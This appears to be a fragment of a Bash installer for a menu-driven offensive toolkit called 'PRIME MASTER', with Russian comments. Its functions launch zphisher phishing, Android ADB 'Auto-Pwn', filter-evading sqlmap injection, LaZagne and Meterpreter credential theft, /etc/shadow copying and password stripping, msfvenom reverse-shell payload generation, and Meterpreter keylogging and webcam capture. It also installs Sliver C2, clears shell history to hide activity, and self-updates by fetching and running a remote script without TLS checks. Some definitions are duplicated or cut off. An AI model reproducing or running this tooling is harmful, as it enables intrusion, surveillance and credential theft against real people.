    local REMOTE_VER=$(curl -sL -k "$VER_URL")
    
    if [ "$REMOTE_VER" == "$CURRENT_VERSION" ]; then
        echo -e "${G}У вас уже установлена актуальная версия v$CURRENT_VERSION${NC}"
        sleep 2
        return
    fi

    echo -e "${Y}Найдена новая версия: $REMOTE_VER. Обновляемся...${NC}"
    local UP_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
    curl -L -k "$UP_URL" -o /root/install_all.sh && chmod +x /root/install_all.sh && exec /root/install_all.sh
}



# Универсальный динамический контроллер
# $1 - Заголовок (Title)
# $2 - Массив названий пунктов
# $3 - Массив соответствующих функций
prime_dynamic_controller() {
    # Превращаем строки обратно в локальные массивы
    local title=$1
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats # Твоя функция статистики (CPU/RAM/DISK)
        echo -e "---------------------------------------"
        
        # Динамическая отрисовка в две колонки для экономии места на экране
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            # Перенос строки каждую вторую итерацию
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        
        # Выход
        if [[ "$choice" =~ ^[Bb]$ ]]; then return; fi
        
        # Проверка: является ли ввод числом и попадает ли в диапазон
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            echo -e "${B}[*] Запуск: ${labels[$idx]}...${NC}"
            ${actions[$idx]} # Вызов функции
        else
            echo -e "${R}[!] Ошибка: выберите пункт от 1 до ${#labels[@]}${NC}"
            sleep 1
        fi
    done
}


# Вспомогательные функции-обертки для корректного запуска Python-скриптов
run_av_srv() { 
    echo -e "${B}[*] Инициализация AV-Scanner...${NC}"
    python3 /root/av_server.py 
}

run_share_srv() { 
    echo -e "${B}[*] Запуск Share-File Server...${NC}"
    python3 /root/share_server.py 
}

run_upload_srv() { 
    echo -e "${B}[*] Ожидание входящих данных (Upload)...${NC}"
    python3 /root/upload_server.py 
}

# Обновленный SECURITY & DATA HUB
run_servers() {
    # 1. Список названий (отображение)
    local srv_names="AV-Scanner Share-File Upload-Inbound"
    
    # 2. Список функций/команд (исполнение)
    local srv_funcs="run_av_srv run_share_srv run_upload_srv"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "SECURITY & DATA HUB" "$srv_names" "$srv_funcs"
}




# --- Глобальные параметры Ghost ---
GHOST_PATH="/root/Ghost"
PYTHON_BIN="python3"

# Функция 1: Ручной режим
# Параметры: нет
# Описание: Запускает интерактивную консоль Ghost Framework
launch_ghost_manual() {
    clear
    echo -e "\033[1;34m[*] Вход в ручной режим Ghost Framework...\033[0m"
    if [ -d "$GHOST_PATH" ]; then
        cd "$GHOST_PATH" && $PYTHON_BIN -m ghost
    else
        echo -e "\033[1;31m[!] Ошибка: Директория $GHOST_PATH не найдена.\033[0m"
        sleep 2
    fi
}

# Функция 2: Сканирование Bluetooth
# Параметры: использует системный hcitool
# Описание: Поиск активных Bluetooth устройств в радиусе видимости
scan_bluetooth_devices() {
    clear
    echo -e "\033[1;34m[*] Сканирование Bluetooth устройств (hcitool)...\033[0m"
    hcitool scan
    echo -e "\nНажмите любую клавишу для возврата..."
    read -n 1
}

# Функция 3: Автоматическое подключение (Auto-Pwn)
# Параметры: target_ip (ввод пользователя)
# Описание: Передает команду connect напрямую в ядро Ghost без входа в консоль
launch_ghost_autopwn() {
    clear
    echo -e "\033[1;32m[*] Запуск Ghost Auto-Pwn Модуля\033[0m"
    read -p "Введите IP адрес цели (Android ADB): " target_ip
    
    if [[ -z "$target_ip" ]]; then
        echo -e "\033[1;31m[!] IP адрес не может быть пустым.\033[0m"
        sleep 1
        return
    fi

    echo -e "\033[1;34m[*] Попытка автоматического сопряжения с $target_ip...\033[0m"
    cd "$GHOST_PATH" && $PYTHON_BIN -m ghost --execute "connect $target_ip"
    
    echo -e "\nСессия завершена. Возврат в меню..."
    sleep 2
}

# Функция: Поиск эксплойтов
# Параметры: query (ввод пользователя)
# Описание: Локальный поиск по базе данных ExploitDB
search_exploit_db() {
    clear
    echo -e "\033[1;34m[*] Поиск в ExploitDB (SearchSploit)...\033[0m"
    read -p "Введите название (например, android 13 или smb): " exploit_query
    
    if [[ -z "$exploit_query" ]]; then
        return
    fi

    # Поиск по локальной базе
    searchsploit "$exploit_query"
    
    echo -e "\nНажмите любую клавишу для возврата..."
    read -n 1
}



# Функция: Автоматизированная экстракция учетных данных
# Описание: Использует LaZagne с умным сохранением и проверкой модулей
extract_all_passwords() {
    clear
    echo -e "\033[1;34m[*] Определение ОС и запуск экстракции...\033[0m"
    
    # 1. Попытка собрать системные хэши (Linux/macOS)
    if [ -f "/etc/shadow" ]; then
        echo -e "[+] Обнаружена Linux-система. Копирование хэшей shadow..."
        cp /etc/shadow /root/reports/shadow_backup 2>/dev/null
    fi

    # 2. Запуск LaZagne (универсальный для всех ОС)
    cd /root/lazagne
    python3 lazagne.py all -oN /root/reports/universal_passwords.txt
    
    echo -e "\033[1;32m[+] Сбор завершен. Отчет: /root/reports/universal_passwords.txt\033[0m"
}


# Обновленный сброс паролей ОС
reset_any_os_password() {
    # Список названий ОС
    local os_names="Windows_(SAM) Linux_(Shadow_Edit) macOS_(Instructions)"
    
    # Существующие функции и команды
    local os_funcs="reset_windows_password reset_linux_pass reset_macos_info"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "OS PASSWORD RESET" "$os_names" "$os_funcs"
}

# Короткие вызовы для интеграции в движок
reset_linux_pass() {
    read -p "Введите имя пользователя: " username
    sed -i "s/^$username:[^:]*:/$username::/" /etc/shadow
    echo -e "${G}[+] Пароль для $username удален.${NC}"
}

reset_macos_info() {
    echo -e "${B}[*] Команда: dscl . -passwd /Users/username newpassword${NC}"
    read -p "Нажмите Enter..."
}



# Функция: Сброс пароля Windows через поиск SAM
# Описание: Автоматический поиск реестра Windows на смонтированных разделах
reset_windows_password() {
    echo -e "\033[1;34m[*] Поиск конфигурации реестра Windows (SAM)...\033[0m"
    
    # Эвристический поиск файла SAM в /mnt и /media
    local sam_files=$(find /mnt /media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null)
    
    if [[ -z "$sam_files" ]]; then
        echo -e "\033[1;31m[!] Системный диск Windows не примонтирован.\033[0m"
        return
    fi
    
    echo -e "[*] Найдены файлы SAM:"
    select sam_path in $sam_files; do
        if [[ -n "$sam_path" ]]; then
            echo -e "\033[1;33m[*] Открытие редактора для: $sam_path\033[0m"
            chntpw -i "$sam_path"
            break
        else
            echo "Неверный выбор."
        fi
    done
}


# Функция: Умный скан на вирусы и руткиты
# Описание: Комбинированный анализ системы на скрытые угрозы
smart_threat_scan() {
    echo -e "\033[1;34m[*] Запуск кроссплатформенного анализа...\033[0m"
    
    # Ищем подозрительные файлы в автозагрузке (Linux/macOS)
    echo -e "[1/3] Проверка автозагрузки (Cron/Systemd/LaunchAgents)..."
    ls -la /etc/cron.* /etc/systemd/system/*.service ~/Library/LaunchAgents 2>/dev/null
    
    # Ищем скрытые бинарники в /tmp и /dev/shm (излюбленные места вирусов)
    echo -e "[2/3] Поиск скрытых исполняемых файлов в памяти..."
    find /dev/shm /tmp -type f -executable 2>/dev/null
    
    # Базовый скан rkhunter
    echo -e "[3/3] Запуск rkhunter..."
    rkhunter --check --sk --quiet
}



# Обновленный PC Recovery & Password Extraction
pc_password_recovery() {
    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
    local pc_names="Extract_Passwords Reset_OS_Password Heuristic_Scan"
    
    # 2. Существующие функции
    local pc_funcs="extract_all_passwords reset_any_os_password smart_threat_scan"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$pc_names" "$pc_funcs"
}




# Обновленный ТЕРМИНАЛЬНЫЙ АНАЛИЗАТОР (TSHARK)
analyze_network_traffic() {
    # 1. Список названий (для корректного отображения пробелов используй _)
    local net_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record_(.pcap)"
    
    # 2. Существующие функции/команды
    local net_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "TSHARK ANALYZER" "$net_names" "$net_funcs"
}

# Вспомогательные функции для корректной работы TShark в движке
run_host_monitor() {
    tshark -i wlan0 -T fields -e frame.time_relative -e ip.src -e ip.dst -e _ws.col.Protocol
}

run_http_dns_sniffer() {
    tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name
}

run_traffic_record() {
    mkdir -p /root/reports
    echo -e "${B}[*] Запись... Нажми CTRL+C для остановки.${NC}"
    tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap
}


# Функция: Глубокий аудит устройства
# Параметры: target_ip
# Описание: Автоматический сбор паролей, проверка портов и анализ системы
run_deep_audit() {
    clear
    read -p "Введите IP цели для полного аудита: " target_ip
    [[ -z "$target_ip" ]] && return

    echo -e "\033[1;33m[!] ЭТАП 1: Поиск уязвимостей (Nmap + ExploitDB)...\033[0m"
    # Сканируем порты и сопоставляем с базой уязвимостей
    nmap -sV --script=vulners "$target_ip"

    echo -e "\n\033[1;33m[!] ЭТАП 2: Сбор учетных данных (LaZagne)...\033[0m"
    # Если это ПК, запускаем lazagne. Для Android Ghost сделает это через свои модули.
    cd /root/lazagne && python3 lazagne.py all -h # Справка или запуск (зависит от ОС цели)

    echo -e "\n\033[1;33m[!] ЭТАП 3: Анализ через Ghost Framework...\033[0m"
    # Автоматизируем Ghost: подключение -> список софта -> поиск подозрительного
    cd /root/Ghost && python3 -m ghost --execute "connect $target_ip" --execute "apps" --execute "activity"
    
    echo -e "\n\033[1;32m[+] Аудит завершен. Данные сохранены в отчеты.\033[0m"
    read -n 1 -s -r -p "Нажмите любую клавишу..."
}

# Обновленное УПРАВЛЕНИЕ УСТРОЙСТВАМИ И СЕТЬЮ
run_device_hack() {
    # 1. Список названий для отображения
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
    
    # 2. Существующие функции
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}


run_phishing() {
    [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh
}

run_ghost_scan() {
    read -p "Target IP: " t
    [ -n "$t" ] && nmap -F "$t"
}

# Дополнение к run_exploit_hub для управления и аудита ПК
# Обновленный PC REMOTE CONTROL & AUDIT
run_pc_control() {
    # 1. Список названий для отображения
    local pc_ctrl_names="Payload_Generator Password_Stealer Remote_AV-Scanner Post-Exploit_Menu"
    
    # 2. Список функций/команд
    local pc_ctrl_funcs="pc_gen_payload pc_steal_creds pc_remote_scan pc_post_exploit"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_ctrl_names" "$pc_ctrl_funcs"
}

# Вспомогательные функции для интеграции существующих команд в движок
pc_gen_payload() {
    read -p "LHOST (Your IP): " lh
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe
    echo -e "${G}[+] Payload saved to /root/payload.exe${NC}"
    read -p "Press Enter..."
}

pc_steal_creds() {
    echo -e "${Y}[*] Extracting credentials...${NC}"
    msfconsole -q -x "use post/windows/gather/credentials/browser_helper; set SESSION $SESS_ID; run; exit"
}

pc_remote_scan() {
    echo -e "${Y}[*] Remote System Scan...${NC}"
    nmap --script smb-vuln* -p 445 $target
    read -p "Press Enter..."
}

pc_post_exploit() {
    echo -e "${B}Active Control: 1-Screenshot  2-Keylog  3-Webcam${NC}"
    read -p "> " act
    case $act in
        1) msfconsole -q -x "sessions -i $SESS_ID -c screenshot" ;;
        2) msfconsole -q -x "sessions -i $SESS_ID -c keylog_recorder" ;;
        3) msfconsole -q -x "sessions -i $SESS_ID -c webcam_snap" ;;
    esac
}


# Обновленный MANUAL INSTALLATION HUB
install_manual_tools() {
    # 1. Список названий для отображения
    local install_names="Metasploit_(Heavy) Searchsploit_(DB) Sliver_C2 LaZagne"
    
    # 2. Существующие функции/команды
    local install_funcs="inst_metasploit inst_searchsploit inst_sliver inst_lazagne"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "MANUAL INSTALLATION HUB" "$install_names" "$install_funcs"
}

# Вспомогательные функции для корректной установки через движок
inst_metasploit() {
    echo -e "${G}[*] Installing Metasploit...${NC}"
    pkg install wget -y && wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
    chmod +x metasploit.sh && ./metasploit.sh
    read -p "Нажмите Enter..."
}

inst_searchsploit() {
    echo -e "${G}[*] Installing ExploitDB...${NC}"
    git clone --depth 1 https://github.com/offensive-security/exploitdb.git /root/exploitdb
    ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit
    read -p "Нажмите Enter..."
}

inst_sliver() {
    echo -e "${G}[*] Downloading Sliver Server...${NC}"
    curl -Ls https://api.github.com/repos/BishopFox/sliver/releases/latest | grep "browser_download_url.*sliver-server_linux" | cut -d : -f 2,3 | tr -d \" | wget -qi - -O /root/sliver-server
    chmod +x /root/sliver-server
    read -p "Нажмите Enter..."
}

inst_lazagne() {
    echo -e "${G}[*] Installing LaZagne...${NC}"
    git clone https://github.com/AlessandroZ/LaZagne.git /root/lazagne
    cd /root/lazagne && python3 -m pip install -r requirements.txt --break-system-packages
    read -p "Нажмите Enter..."
}



run_exploit_hub() {
 # Обновленный EXPLOIT HUB: TOTAL CONTROL
run_exploit_hub() {
    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
    
    # 2. Существующие функции и прямые команды
    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

# Вспомогательные функции для интеграции команд в движок
ex_phonesploit_pro() {
    cd /root/PhoneSploit-Pro && python3 phonesploitpro.py
}

ex_pc_network_scan() {
    read -p "Target IP: " t
    nmap -sV --script vuln "$t"
    read -p "Нажмите Enter..."
}



run_sqlmap() {
    clear; zero_clear
    echo -e "${Y}>>> [ SQLMAP: SMART INJECTION HUB ] <<<${NC}"
    echo -e "${B}Enter Target URL or 'w' for Wizard:${NC}"
    read -p ">> " target
    
    [ -z "$target" ] && return

    if [[ "$target" == "w" ]] || [[ "$target" == "W" ]]; then
        # Стандартный мастер для новичков
        sqlmap --wizard
    else
        echo -e "${G}[*] Analyzing target: $target${NC}"
        # Эвристический запуск: 
        # --batch (без лишних вопросов), --random-agent (маскировка), 
        # --level 2 (глубже обычного), --tamper=space2comment (обход простых фильтров)
        sqlmap -u "$target" --batch --random-agent --level 2 --threads 5 --tamper=space2comment --dbms=mysql
    fi

    zero_clear; history -c
    read -p "Press Enter to return..."
}
run_iban_scan() {
    clear
    echo -e "${R}== [ IBAN VERIFICATION ] ==${NC}"
    read -p "IBAN: " v_iban
    python3 /root/iban_check.py "$(echo $v_iban | tr -d ' ')"
}

# Обновленное ГЛАВНОЕ МЕНЮ (PRIME MASTER)
run_main_menu() {
    # 1. Список имен (названия пунктов в меню)
    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL UPDATE_CORE SERVICE_HUB EXIT"
    
    # 2. Список соответствующих функций
    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools update_prime run_servers exit_script"
    
    # Запуск через динамический контроллер
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}

# Вспомогательная функция для чистого выхода (БЕЗ блокировки Wi-Fi)
exit_script() {
    echo -e "${Y}[*] Очистка истории сессии...${NC}"
    history -c
    exit 0
}


EOF
repair
run_main_menu
    # Применяем версию и записываем через нашу надежную функцию
    code="${code//\{\{V_NUM\}\}/$v_num}"
    smart_cat "$target_file" "$code"
}

update_module "/root/av_server.py" "1.6" generate_av_server_code "AV-Scanner"
update_module "/root/iban_check.py" "1.7" generate_iban_code "IBAN/RIB Checker"
update_module "/root/share_server.py" "1.0" generate_share_server_code "File-Share"
update_module "/root/upload_server.py"  "1.0.4" generate_upload_server_code  "Inbound-Drop-Box"

# --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
update_module "/root/launcher.sh" "30.8" generate_launcher_code "Prime-Launcher"
chmod +x /root/launcher.sh
ln -sf /root/launcher.sh /usr/local/bin/launcher
repair_and_clean
create_repair_script
setup_cron
echo -e "\n${G}[✔] PRIME v$CURRENT_VERSION ПОЛНЫЙ ОРИГИНАЛ ВОССТАНОВЛЕН. Введи: launcher${NC}"
